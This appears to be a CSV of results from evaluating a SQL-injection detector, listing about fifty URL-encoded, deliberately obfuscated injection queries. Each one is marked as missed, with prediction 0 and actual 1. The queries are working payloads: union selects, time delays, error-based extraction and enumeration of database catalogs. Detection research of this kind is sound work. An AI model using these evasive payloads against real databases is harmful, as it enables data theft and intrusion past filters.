,Query,Prediction,Actual
11004,"%31'   )%20 %20 )  %20 %75n%69o%6e %61l%6c s%65l%65ct %6eu%6cl%2cnul%6c,%6eull%2cn%75l%6c,nul%6c,nul%6c,n%75l%6c,n%75ll%23 ",0,1.0
11005,1%20o%72 %32*3-6%20o%72 %30 ||%20 S%49N(0%29+%30+%30+%53IN(0)%2b842%31=%28+2%2f2%2d1%2b0 %20selec%74 %63ount%20 %28 %20* %20) %20 f%72o%6d gen%65r%61t%65_s%65r%69es  (%20 1%2c5%3000000 %20 )  %20 ) %20 %2d-%20x%67y%63 ,0,1.0
11006,"%31%%27 pro%63e%64u%72e%20an%61lys%65  ( %20ex%74ract%76a%6cu%65  ( %205%384%30,%63o%6ecat%20 (%20 0x5%63,%30x%371717%306%6171,  %28 %20sele%63t %20 %28 %20c%61se%20w%68e%6e %20 %28   S%49N(%30)%2b2*3-6+58%340%2b8-8=%53I%4e(%30)%2b5%384%30+%32*3-6%20 )   th%65n%201 %65l%73e %30 end %20 )%20 %20 )%20  ,%30x71%37a%3767%6171  %20) %20  )%20  ,1%20 %29 %20 &%26 1 aN%64 %31 aN%64 %20SI%4e(%30)%2bSI%4e(%30)%2bS%49N%280)%2b'%25'+%32/2-1%3dSIN(%30)%2bS%49N(0)+%27+2/%32-%31+0%2b2%2f2-1 ",0,1.0
11007,"%31  )   %77her%65  2/2-1+%3982%39+%32*%33-%36+%32/2-1+0+%30=%39829%2b8-%38+%30 o%52 %32*%33-%36 %6fR SI%4e(0%29 %6fR %30 %6fR c%68ar  %28  %375  )  %7c|%63h%61r  (%20 %370 %20)%20 ||c%68a%72  (  %399  %29  ||ch%61r%20 (%20 %383%20  %32/2-%31+%29+%30+%32/%32-%31=0+r%65ge%78p_su%62stri%6eg%2b2/2-1%2b2%2f2%2d1+2/%32-%31  (  re%70e%61t  ( %20le%66t%20 %28  c%72ypt_%6bey  %28 %20c%68ar%20 %28 %206%35 %20) %20||%63h%61r%20 (%20 %369 %20)  |%7cc%68a%72 %20(%20 %383%20 )%20 %2cn%75l%6c %20) %20,0%20 %29 %20,%3500%30000%300%20 %29 %20,%6eull%20 %29 %20-%2d ",0,1.0
11008,1%%27 %20)%20  %4fR%202/2%2d1 o%72 %208%351%34+%38-8+8%2d8=SI%4e(%30)%2b2%2f2%2d1+%62e%6ech%6da%72k+%53I%4e(0)+2%2a3-%36+%30  %28 %205000%3000%2cmd5%20 (%20 %30x5%344d%35a%34c%20 %20) %20 %20)%20  %23 ,0,1.0
11009,"%31%'  %20) %20  )    %4fR 2*3%2d6 %4fr %32/2-1 or %32*%33-6%20||%20 7417%2bS%49N%280%29+%38-8%3d2/2-%31+0+%28+%32/2-1%2b2*%33-6%2b8-%38 %20sele%63t%20c%6funt %20(  *  )%20 %20fr%6fm%20s%79s%69bm.%73ys%74a%62l%65s%20a%73 t1,sy%73i%62m.s%79stab%6ces%20a%73 %742%2csys%69b%6d.%73y%73t%61b%6ce%73 %61s%20t%33  %29  -%2d ",0,1.0
11010,%2d30%382 %22 %20)%20 %20whe%72e%20 %32*3-6%2b8-8%2b10%382%2b2/2-1=%310%382%2b0+%32/%32-1 OR%202%2a3%2d6%20OR%202/2-%31 %6fr%20 %32/%32-1%2b5023%2b0+%38-%38+%32*%33-%36=0+S%49N%280%29+0+c%74xs%79s%2edr%69t%68s%78.%73n%2bSIN%280%29 %20( %2050%323%2c %20(  ch%72 %20(  11%33  )  %7c|%63h%72 %20(%20 11%33  %29 %20|%7cc%68r%20 %28  %3112%20 )%20 %7c|%63hr  (%20 %310%36  %29  %7c|c%68r %20(  %3113%20 %29 %20O%52 0%20O%72 %20(%20 se%6cect %20 ( %20cas%65 w%68en%20  ( %20 2%2a3%2d6+%350%323%2bSI%4e(%30)%2b0+SIN(%30)%2b0=S%49N(%30)+%32*%33-6%2b8%2d8+%53I%4e(0)+50%323%20 %29 %20 %74h%65n %31 els%65 %30 e%6ed%20 ) %20 %66ro%6d dual  ) %20|%7cc%68r%20 ( %201%313%20 %29  |%7cch%72 %20( %2012%32 %20)%20 |%7cchr%20 ( %201%318  %29  ||chr%20 ( %20122 %20)%20 ||c%68r%20 (%20 1%313%20  %29   %20)%20 %20  )%20 %2d- ,0,1.0
11011,%2d4%3104%%27 %6fR%202%2f2%2d1%20o%72 2/2-%31 or 2/%32-%31 Or  %30+%334%340%2b2%2f2-1%2b2%2a3-%36=8%2d8%2bc%61s%74+8-8%2b2/%32-%31   ( %20  %28 %20 %63h%72 %20(%20 11%33  %29 %20|%7cc%68r  %28 %20113%20 ) %20||%63h%72  ( %201%312%20 %29 %20||%63h%72 %20( %2010%36 %20)%20 %7c|c%68r%20 (%20 1%313%20  ) %20  )  %20|%7c %20(  select %20 (%20 ca%73e%20wh%65n%20  %28   %32*3%2d6%2bS%49N%280%29+%38-8+3440+2%2f2%2d1+%53IN%280)=2*3%2d6%2b3%344%30+%53IN(0)%2b2*3-%36  )   %74he%6e %31 el%73e %30 %65n%64 %20 )%20   )%20  ::%74ext%7c|%20 %28 %20chr %20( %201%313 %20)  %7c|c%68r  %28  1%322%20 )  |%7cc%68r  ( %201%318  %29 %20||%63h%72  (%20 %3122 %20)  %7c|%63h%72  ( %20113  %20)%20 %20 )%20 %20 %61s%20n%75me%72i%63 %20)%20  an%64 1%20&%26 %31 %26&  2*3-%36+%27%'%2bSI%4e(0)+2*3%2d6%2bS%49N%280%29+S%49N%280)%3d8%2d8+SI%4e(%30)+%27+%32*3-%36 ,0,1.0
11012,"%31' %20 %29 %20  )%20 %20 %70r%6fc%65d%75r%65 %61n%61lyse%20 %28  ext%72act%76a%6cue  %28  %3584%30,con%63a%74  (%20 0%785c%2c0x7%317%317%306%6171,  %28 %20s%65lec%74 %20 (  cas%65 w%68e%6e %20 ( %20 %32/%32-%31+5%3840+8-%38=%53I%4e(0%29+5%3840%2b2%2f2-%31+SIN%280)%20 ) %20 %74hen%201%20e%6cs%65 %30 e%6ed%20 %20)%20 %20 %29 %20 %2c0x%3717a7%367%617%31  %20)%20  %20)%20 %20,1%20 )%20 %20and %31 %41n%64    %28  %20 %28 %20 %208%2d8%2b2*3%2d6+%53IN%280%29+%38-8%2b'%62a%63m'+%32*%33-%36=%30+%27ba%63m%2b8-%38 ",0,1.0
11013,selec%74   (%20 %63ase%20when%20 %20( %20 %30+8%2d8+%32*3-%36+%38618+%53I%4e(0)+0=8%2d8%2b8%370%36+2%2f2%2d1%2b8%2d8+8-%38 %20)   %74h%65n%2086%318%20el%73e%20861%38*%20 %28 %20se%6cect%208%361%38 f%72o%6d m%79sql%2ed%62 %20)%20  %65nd %20)%20 #%20,0,1.0
11014,"%2d2605 %22 %20)%20  O%72 2*%33-%36 %6fr %38-%38 Or %208-%38+0%2b44%393+%32*%33-6%2b0=8-8+ut%6c_%69na%64dr.%67et_h%6fst%5fad%64re%73s+2%2a3-6+SI%4e(%30)%2b2%2f2%2d1+%32/%32-1 %20(%20 %63h%72 %20(  11%33 %20) %20|%7cc%68r%20 (%20 11%33 %20) %20|%7cc%68r %20( %20112  )%20 |%7cchr%20 (  1%306%20 %29  %7c|%63hr %20(%20 %3113 %20) %20||%20SIN(%30) o%52  (%20 se%6cec%74   %28 %20c%61se%20w%68e%6e  %20(%20  %34493+2%2a3-%36+%30=%30+4%3493%2b2%2f2%2d1%2b0 %20)%20 %20then 1 else %30 e%6ed %20)%20  %66rom d%75al%20 %29 %20||%63hr  %28  1%313%20 %29 %20||%63h%72 %20(%20 122%20 )  ||%63hr%20 (  1%318  %29 %20|%7cchr  ( %201%322  %29  ||chr  (%20 1%313%20  )  %20 )    an%64 %31 AND %20 (%20  ""c%69k%62 %22 %6ci%6be %20""%63ikb%20",0,1.0
11015,1%20 %20)  %20 )%20 %20  %29 %20 %4fR%202*3%2d6%20o%72 8%2d8%20or 2*%33-6 |%7c  0+8-8+SI%4e(%30)+2*%33-%36+%30+4%3240%3d8-%38+2%2a3-6+%28+%53IN(%30)%20 s%65lec%74 %342%340%20fr%6fm%20pg%5fs%6ceep%20 %28  5   %29   %20)  %20-- ,0,1.0
11016,%31 %27qh%66y<%20'%22>ut%77q ,0,1.0
11017,1%20 %29 %20 %77her%65  %30+2%2f2%2d1%2b2%2f2%2d1%2b1120%2b2/%32-1%3d2%2a3-%36+%53I%4e(0)%2b11%320+0 ,0,1.0
11018,1 %22 %20)   or%64er by %31# ,0,1.0
11019,"1%%27 %4fr 2*%33-%36 %6fr%208%2d8%20|| %32*%33-%36 %6fR%20 %32*%33-6+8%2d8%2b6%397%39+0%2b0=%38-%38+2/%32-%31+%6ci%6be+%32*3-6%20 %28 %20'a%62cde%66g',u%70p%65r%20 (%20 h%65x  %28  %72an%64omb%6cob  (  5%300%300%300%300/2%20  %29    %29 %20 %20 %20)%20  %20)   -%2d ",0,1.0
11020,"s%65lect%20cou%6et%20 %28 %20* %20)  %20f%72o%6d %72db%24f%69elds%20as t%31,rd%62$%74y%70e%73 a%73 t2,r%64b%24c%6fl%6ca%74ions a%73 t3%2crd%62$%66u%6ec%74ions%20as%20t4%20A%6ed 1 %61nd%20 %20 (%20 %20 %28 %20 %20 (%20 %20""ds%6bh ""%202/2-%31+8%2d8+%2b8%2d8+2/%32-%31=+0+0%20""%64s%6bh%20",0,1.0
11021,"1%25 %22 %20 ) %20  %29    aN%64 %31 %61Nd%201 aNd%20e%78t%72a%63tv%61l%75e%20 %28  %379%382%2cc%6fn%63a%74 %20( %200%785c%2c0%787171706a71,%20 %28 %20s%65lect%20 %20( %20elt %20(%20 %202%2f2-%31+8-8+%379%382+%38-8%2bSIN%280)=%32*%33-6+0+%53IN%280)%2b7%3982,%31+%30   )%20 %20 %29   %20 )%20 %2c0%78717%61767%617%31   )   %20)  %20 %61nd  %20 %28   %20(  %20 ""%25 %22 %32*%33-6+%2b2*%33-6+%30+S%49N(0%29=8%2d8%2b+8%2d8%20""%20",0,1.0
11022,"%31 %22  %20)%20  %20)%20  %20a%73 %77oo%71 %77h%65r%65  2%2a3%2d6%2b2%2a3-%36+%30+%376%371+8%2d8%3d2%2a3%2d6+2/%32-%31+%37671+2%2a3%2d6 %41ND %31 %41nd%20r%6fw%20 (  %3623%37,%374%369%20 )%20 %3e  (%20 %73e%6ce%63t%20co%75n%74  %28  * %20) %20,%63onca%74  %28 %200%787%317170%36a%371, %20( %20s%65l%65ct %20 %28 %20e%6ct  %28 %20 %32/%32-1+%362%337+2%2f2-%31=2*3-6+%362%337,1+2%2f2-%31  %20)%20   %29 %20   %29  %2c0x717a76%37a7%31,f%6co%6fr  %28 %20r%61nd  %28 %200%20 %29  %2a2%20  %29 %20 %20) %20 x %66r%6fm %20 ( %20s%65lect%2051%392%20u%6eion s%65l%65ct%2037%385%20u%6eio%6e s%65l%65c%74 3%393%31 %75n%69o%6e %73ele%63t%2071%358  %29 %20a%20gr%6fu%70 %62y%20x  %29  -%2d ",0,1.0
11023,1  %20)  %20 ) %20 %20a%73 %77w%6bw %77h%65re%20 %53I%4e(0)%2b7%3289+%53IN(%30)%3d72%389+0+2%2f2%2d1 %41N%44 1%20a%4ed%20 75%333+8%2d8+%53I%4e(0)%3d0%2b7%3533-%2d+2%2f2%2d1+%32*%33-%36 ,0,1.0
11024,"%31'%20O%52 2/%32-%31 %6fr%20 %30+%385%314+8-8+2*%33-6%3dS%49N%280)%2b0+%62e%6ec%68mark%2bSIN(%30)%2b8%2d8+%38-%38  ( %205%300000%30,md5 %20(  0%78544%645%614c %20 )  %20 %29 %20 %23 ",0,1.0
11025,"%31 "" w%68e%72e %20SIN%280%29+%3445%30+%30=%53IN(%30)+%344%350+%30 o%72 2/2-%31 %4fr%20 S%49N%280)%2b2*%33-%36+%3697%39+2%2a3-%36=%32/%32-1+0+%6ci%6be+%38-8  (  %27a%62c%64e%66g%27,%75p%70e%72  %28 %20hex%20 (  r%61ndomb%6cob%20 (  %350%3000%300%300%2f2%20  )%20  %20)%20 %20 %20 %29    %29   -- ",0,1.0
11026,"1%25'%20  %29 %20  )%20 %20 O%72 %53IN%280) o%52 %38-8%20OR%202/2%2d1 o%52 %20 (%20 %73el%65ct%209%317%33 %66ro%6d %20(  %73elec%74 %63o%75nt%20 (%20 *%20 %29  %2cc%6fn%63at%20 %28  %30x%37171706%617%31,%20 %28 %20s%65le%63t%20 %20(  e%6ct %20(%20  %32/2%2d1+%391%373+%32/%32-%31+%30=%30+%38-8%2b9%317%33,1+%30+8%2d8+%53I%4e(%30)%20 %20)%20 %20 %29 %20 %20 %29 %20,0%787%317%61767%6171%2cfloor %20( %20r%61nd%20 (  %30  ) %20*2 %20 ) %20 %20)%20 %20x%20f%72o%6d %69nf%6frmat%69o%6e_%73ch%65ma.%63ha%72a%63t%65r%5fs%65t%73 grou%70 by%20x  )%20 a%20 %29 %20 a%6ed%201%20A%4eD%20  %20(  %20 %28   %202%2f2-1+SI%4e(%30)%2b'%25'%3d8-8+%27+%38-8%20",0,1.0
11027,1%27 %77h%65r%65 %200+5%3778%2b2/2%2d1=%53IN(0%29+2*%33-6+5%3778%2b2*%33-%36+2/%32-%31+0 ,0,1.0
11028,%2d88%360%20 ) %20 %4fr%200%20OR%200%20O%72 %20S%49N%280%29+SI%4e(0)+4%314%34+%32*3%2d6%2b2*3-6=SIN%280)+(+8-%38+%32*%33-6%2b2*3%2d6%20 %73el%65c%74 uppe%72  (%20 xml%74y%70e %20(%20 chr %20( %2060 %20)  |%7cc%68r%20 (%20 58%20 )%20 %7c|%63h%72  %28  %3113%20 %29  |%7cch%72  %28  %3113  %29 %20||chr  %28 %20112  %29 %20||%63h%72 %20(  1%306%20 ) %20|%7cc%68r%20 %28 %201%313%20 )  %7c|%20 ( %20sel%65ct   (%20 c%61s%65 %77h%65n%20  %28 %20 %32/%32-1+%53IN(0%29+%3414%34+SI%4e(0%29=SI%4e(0)+%34144%2bS%49N(0)  %29   %74h%65n 1%20e%6cse 0%20e%6ed %20)%20  f%72o%6d d%75a%6c %20)%20 %7c|%63hr %20(%20 %311%33 %20)  ||%63h%72  %28 %201%322 %20)  ||%63hr%20 %28 %20118 %20) %20|%7cchr%20 %28 %2012%32  %29  |%7cch%72 %20(%20 1%313%20 %29 %20|%7cc%68r%20 %28 %206%32 %20 )%20   %29 %20   %29 %20 fr%6fm %64u%61l %20)%20 ,0,1.0
11029,-18%374 %22 %20)   as %77gp%6a wh%65r%65 %200%2b2/%32-%31+6481%2b2%2f2%2d1%3d2/2-1+%32/2-%31+%32/2%2d1+8-%38+64%381 OR%200%20o%52 S%49N%280) %7c|%20 %53IN%280)%2b8-8+36%329%2b2/2%2d1+%30+%32/2-1=S%49N%280%29+%53I%4e(0)%2b2/2-1%2b8%2d8+%334%359+%32/%32-%31 ,0,1.0
11030,"%31'%20 %29  %20aN%64 1 a%6ed %202*3-6%2b2*3%2d6+%384%307%2b2*%33-%36+S%49N(0%29=2%2a3-6%2bSI%4e(0)%2b0+%28+2/%32-1+%30  %73ele%63t %63o%75n%74 %20(%20 %2a  )%20 %20f%72om generate%5fs%65rie%73 %20(%20 %31,5000000 %20 )  %20 ) %20 %20an%64 %20 %28  'lwr%6b'%20l%69k%65 'l%77rk%20",0,1.0
11031,"%31% ""%20rl%69k%65  %20(  sele%63t  %20(%20 c%61s%65 %77he%6e  %20( %20 0%2b2%2a3%2d6+2/2%2d1+5135%2b8%2d8%2b2/%32-%31=2%2f2%2d1%2b0+%3983%39+2*%33-6%20 ) %20 %74h%65n%201 e%6cs%65 0x%328%20en%64 %20 )    ) %20 %20An%64 1 %61Nd %20""%25 %22 %32*%33-6%2b0%2b8-8+%53IN(%30)%2b+2/2-%31=%32*%33-6%2b0%2b "" ",0,1.0
11032,"%73e%6ce%63t%20cou%6et %20(%20 *%20 )   %66rom%20a%6cl%5fu%73er%73 t1%2ca%6cl_us%65r%73 %742,%61l%6c_users%20t3%2cal%6c_u%73er%73 %744%2ca%6cl_%75s%65r%73 t%35 %61Nd%201 %41nd  %20(%20 %200+%394%381%2b2%2a3%2d6%3d2*%33-%36+%38-%38+%3948%31+%30+%53I%4e(0%29 ",0,1.0
11033,%31' i%6e %62oo%6cea%6e m%6fde %20) %20 aNd%201 aN%64  %32*3-6+SIN(%30)%2b6%353%37=8-8+%53I%4e(0%29+%64b%6ds_p%69p%65.r%65c%65i%76e_m%65s%73a%67e%2b2%2a3%2d6+2%2f2-1  (%20 %63hr%20 %28 %207%36  %29 %20||c%68r%20 (  1%316%20 ) %20|%7cc%68r  ( %201%317%20 %29  %7c|c%68r  %28 %2065%20 )%20 %2c5 %20) %20#%20,0,1.0
11034,-%331%385'%20 %20)  %20 %29  %20 %4fR S%49N(%30) oR %30 %4fR%20 %53I%4e(%30)+%53IN%280%29+34%340%2b8-8+%30=S%49N%280)%2bS%49N%280)%2bcast   %28 %20  (  %20chr  ( %20113  %29 %20|%7cchr %20( %201%313 %20)%20 %7c|%63h%72  (%20 112  %29  %7c|%63h%72  (%20 10%36 %20)%20 |%7cc%68r%20 %28 %201%313%20  )%20   )%20 %20|| %20(%20 se%6cec%74  %20(%20 ca%73e whe%6e %20 %28 %20 2%2f2%2d1+%38-%38+8-%38+34%340=0+3440%2b2*3%2d6 %20)%20 %20t%68en%201 %65lse %30 %65n%64  %20)%20  %20)   %3a:te%78t%7c| %20(%20 c%68r%20 %28 %20113 %20) %20|%7cch%72  (%20 1%322  %29  ||%63h%72  %28  %3118 %20)%20 %7c|%63hr %20( %2012%32  %29  ||chr%20 %28  11%33 %20 ) %20  )%20   as %6eum%65ri%63 %20)%20 %20An%64 %31 %41n%64  %20 ( %20 %20(%20 %20'rk%6ed%27 %6cik%65 'rk%6ed ,0,1.0
11035,"%31 %22 %20)   O%52 SIN%280%29 O%72 %38-%38 %7c| %30 O%52 %20 %28  s%65le%63t 9%3173%20f%72om%20 (%20 %73e%6ce%63t%20cou%6et%20 %28  *  %29  %2cc%6fn%63a%74 %20(%20 %30x717%31706a%371%2c %20( %20se%6cec%74   (%20 %65l%74  (%20  8-%38+2*3%2d6+%3917%33+S%49N(%30)+%38-8%3d2%2f2-1%2b9%317%33,%31+%32*3-6%20 %20)%20 %20 %29  %20  %29  %2c0%78717a767a%371,%66lo%6fr  (%20 ran%64  ( %200  ) %20*%32 %20 )%20 %20 %29  %20x%20f%72o%6d inform%61ti%6fn_sch%65ma%2ec%68a%72ac%74er%5fs%65ts gr%6fu%70 b%79 %78 %20) %20a  )%20 %20and%201%20An%64   %28 %20 %22njdu%20""%20l%69ke  %22n%6adu%20",0,1.0
11036,%31%'%20  %29 %20 %20)%20    %29  %20A%6ed%201%20aN%44  %53IN(%30)+%32444+SI%4e(%30)+8%2d8=8-8+%32/%32-%31+%38-%38+9%328%32 %23,0,1.0
11037,-%339%375' %20)%20 %20o%72 2/%32-%31 %6fr%20m%61ke%5fse%74 %20( %20 %53IN%280)%2b8-8+%31943%2b0%3d8%2d8+%32*%33-%36+%334%399%2c3%349%39 %20) %20 %61N%44 %31 %61Nd%20 %20(%20  %38-8%2b8%2d8+'%64aw%62'%2b2/2%2d1+2*%33-6=%32*%33-%36+%32*%33-6+'da%77b+SIN(0)%20,0,1.0
11038,"-80%321 %22  ) %20 u%6ei%6fn %61l%6c se%6ce%63t %311%366,%31166%2c1%316%36,%3116%36-%2d ",0,1.0
11039,1%27||  (%20 s%65l%65c%74 %27rjun' wher%65  %32/%32-1+8-8+%388%368=%53I%4e(%30)+%3886%38+%53IN(%30)+SI%4e(%30)+%53I%4e(%30)%20a%4ed%201%20AND %33715%20in %20  (%20   (%20 %20c%68ar  ( %20113%20 %29 %20+ch%61r  %28 %201%313%20 %29 %20+ch%61r  %28  %311%32 %20)%20 %2bc%68ar%20 %28 %201%306  %29  %2bc%68a%72 %20(  113%20 )  %2b  ( %20s%65l%65c%74 %20 %28  %63a%73e%20w%68en%20  (  %208%2d8+3%371%35+SI%4e(0%29+%53I%4e(0)+2%2a3%2d6%3d2%2f2-1%2b2%2f2-1%2b371%35+8%2d8%20 %29   %74h%65n %63h%61r %20( %204%39 %20)%20 %20else%20c%68ar%20 %28 %204%38 %20)%20  %65n%64 %20 %29 %20 %20)%20  %2bc%68ar%20 %28  11%33 %20)%20 %2bc%68ar %20(%20 %3122 %20)  +%63har  %28 %2011%38 %20) %20+c%68a%72 %20(%20 %3122%20 %29 %20+%63h%61r%20 (%20 %311%33  %20)%20 %20 %29  %20 %20 %29   %20)   %7c|' ,0,1.0
11040,"1 %20 %29 %20  %29    as %7akrr w%68er%65 %200%2bS%49N(0)+SIN%280%29+%34730+%38-8%3d8%2d8+%347%330%2b2%2a3%2d6%2b2/%32-1%2bS%49N(0%29 %6fr 8%2d8 %4fr%208-8%20O%72  0%2b8-%38+%38466%2b2%2f2-1+2%2a3%2d6=%38-8%2b8-%38+SIN%280%29+%53I%4e(0%29+%38-8+%62e%6ec%68ma%72k%20 %28  5%300%3000%30,md%35 %20( %200x694%6147%345 %20 )%20   %29 %20 -- ",0,1.0
11041,"%31% "" %20 )%20 %20 %29  %20  )%20  or 0%20||%200%20or%200 or%20 %53IN(0)+%32/%32-%31+%3236%37=%32/2%2d1+(%2b0%20 s%65le%63t %63o%75n%74  (%20 *  %29  %20f%72o%6d %72d%62$%66i%65lds %61s%20t1%2crd%62$ty%70e%73 as t%32,%72d%62$c%6fll%61ti%6fns%20as%20t3,r%64b%24f%75n%63t%69o%6es%20as %744 %20)  -%2d ",0,1.0
11042,"%31  %20)    )%20 %20  %29   %61ND%201 %61Nd%20 6%3537+SIN%280%29+%32*%33-6%3dS%49N%280%29+%32*%33-6+%64b%6ds%5fp%69p%65.re%63e%69ve_%6de%73sag%65+%30 %20(%20 chr%20 %28 %207%36  %29  ||chr%20 (  11%36  )  %7c|%63h%72 %20(%20 117%20 )  %7c|%63hr%20 (  6%35 %20)  ,5 %20)  %20an%64   %20(%20  %20( %20 %20 %28 %20 2/%32-1+%30+657%38+%30+2%2a3-6%3d0+%36578%2b2*%33-6 ",0,1.0
11043,1'%20wh%65r%65 %200%2b2*%33-%36+%3266%31+0+8%2d8+2*3-%36=2/2-1%2b266%31+S%49N%280%29+%32/2-1%20,0,1.0
11044,"%2d46%386%20""%20 %29   %61s dx%6bs%20wher%65  2%2f2%2d1+%32/%32-1+%3712%33+SIN%280)%3d8%2d8+2/%32-%31+%371%323%2b2/%32-1 OR%202%2f2-1 %6fr e%6ct%20 ( %20 0%2b10%332+0%3d2/%32-%31+8-%38+1%303%32,%336%323+%32*%33-6%2b2%2a3-6+%32*3%2d6 %20) %20--%20",0,1.0
11045,"%31 %22 OR 8%2d8%20Or%20S%49N%280) %4fr %63har%20 %28 %206%38  )%20 %7c|char%20 %28  6%39  )%20 |%7cc%68a%72 %20(%20 97%20 %29  %7c|ch%61r%20 %28  85  %20)%2b2%2a3%2d6+%53I%4e(%30)+%32*%33-6+%30+%32*3-6%3dreg%65xp_%73ubs%74r%69ng%2b2%2f2%2d1+%30+2/2-%31 %20(  re%70e%61t%20 %28 %20r%69ght%20 %28  c%68ar  %28 %205%338%39 %20)  ,0%20 %29 %20,5%3000%300000%30 %20)%20 ,%6eull %20)%20 %20a%6ed %31 %61n%64 1 a%4eD %20""%64tw%76 ""%20l%69ke  %22dt%77v ",0,1.0
11046,"%31 ""%20 )%20 %20as %61i%66d%20wh%65r%65 %202*%33-%36+8%2d8+%35962%2b2%2f2-%31+2%2f2-1=%38-8%2b2*%33-%36+5%396%32+%32/%32-%31 ",0,1.0
11047,"1' %20 %29  %20 %29 %20   )%20 %20AND %31 a%6ed 1%20And%20c%68ar%20 %28  1%320  ) %20||%63h%61r %20( %201%306%20 ) %20|%7ccha%72 %20(  1%317%20 %29 %20||%63h%61r %20( %2085 %20 %32*3-%36+8%2d8+%29+%30+%53I%4e(%30)%2b0%3d2%2a3%2d6%2bSIN%280)+S%49N%280%29+%72ege%78p%5fs%75bs%74r%69ng+2%2a3-%36  (%20 re%70eat%20 %28  %72i%67ht  (%20 c%68a%72 %20(%20 9%398%31  %29  %2c0  %29 %20,5%300%3000%300%300%20 )%20 %2cnu%6cl %20)  %20a%6ed%20 %20 %28  %20 (%20  %20 %28  's%6axp%27 li%6be 's%6axp ",0,1.0
11048,"-9%348%37  %20)  %20 )%20 %20 %61s%20r%76ck%20w%68ere %208-8+%38-%38+9%3404+8-8+%53IN(0)=9%340%34+0+%32/%32-1 OR%208-%38 %4fr%20ma%6be%5fset%20 %28 %20 %53I%4e(0)+0%2b8%3921%2b0%2bS%49N%280%29=0%2bSI%4e(0)%2b6%3045,%360%345+2%2a3%2d6+2*3%2d6 %20)%20 %2d-%20",0,1.0
11049,"1%27 %20)   %61s%20ea%6ey%20wh%65r%65 %200%2b0+3%316%39+SIN(%30)+%32*3-6=%30+%38-8%2b3%316%39+SIN%280) aND%201 %61n%64  %38-%38+6%3414+%30+8-8=SIN(%30)%2b2%2f2-1+%30+(  %73e%6cect%20co%75nt%20 (%20 %2a  %29   from%20rd%62$f%69e%6cd%73 %61s %741,%72d%62$types a%73 %742,rdb%24c%6fl%6ca%74i%6fn%73 a%73 t%33,rd%62$fu%6ec%74ions%20as t%34 %20)  %2d- ",0,1.0
11050,1'%20  )%20 %20 )    %20) %20 %77ai%74for%20d%65lay%20'%30:%30:5%27 %61ND%201 aND%201%20and %20  %28 %20 %20(%20 %20  ( %20 %38-8+%53IN(0%29+0+SI%4e(0%29+%27w%76z%62'%2b2%2a3-6%3d2/2%2d1%2bSIN(%30)%2b8%2d8%2b2*%33-%36+%27w%76z%62+2%2f2%2d1 ,0,1.0
11051,"%77a%69tf%6fr%20d%65l%61y%20 %270%3a0:5 '%20aN%64 1%20A%4eD%20 %20(%20 %200%2b2*%33-%36+""%64mcu%22+2/%32-1=%30+0+%32*%33-%36+%22dm%63u+%32/%32-1%20",0,1.0
11052, %28 %20s%65l%65ct%20  (  %63hr%20 (  %3113%20 %29  |%7cchr %20(  %3113  %29  %7c|%63hr %20(  112%20 )%20 |%7cchr%20 %28  10%36 %20)%20 %7c|c%68r %20(  %3113%20  )    %29   OR %30 o%52 %20(%20 s%65le%63t  %20(%20 c%61se%20whe%6e   (   8-%38+%332%387%2b0%3d0+3%328%37+%53IN%280%29+8-%38  %29 %20 %74he%6e 1%20e%6cs%65 %30 end%20 %20)  %20 )%20 %20::text|| %20( %20c%68r%20 %28 %201%313%20 ) %20|%7cc%68r%20 ( %2012%32 %20) %20|%7cc%68r %20( %201%318 %20)%20 %7c|%63hr%20 %28  %3122  )  ||%63h%72 %20( %20113%20 %20)%20  %20)%20  %20 )%20 ,0,1.0
11053,"%31  %20)%20   )  %20  )%20  a%4eD%201%20aN%44 %75pd%61te%78m%6c  %28 %2033%393%2ccon%63a%74 %20(%20 %30x%32e,%30x%371%371706%617%31,%20 %28 %20s%65l%65ct%20 %20(%20 %65l%74  (%20 %20S%49N%280)+0%2b3393+S%49N%280)=%38-%38+SIN%280)+2*3%2d6%2b2%2f2%2d1+3%339%33,1%2b2/2%2d1%20  %29 %20 %20)%20 %20 %20)  ,%30x%3717%6176%37a7%31 %20) %20,%311%361%20 )%20 %20an%64 %20  %28    (%20    (%20 %205199%2b0+8-8%2b2/%32-%31=2*3%2d6+SIN%280)+%3519%39+%32/2%2d1%2b0 ",0,1.0
11054,%2d3%3648%27 wh%65re%20 %53IN%280)+%53I%4e(%30)%2b462%39+%30+%38-8%2b8-%38=%32*3%2d6%2b4%3629%2bS%49N(%30) %6frde%72 %62y%201-- ,0,1.0
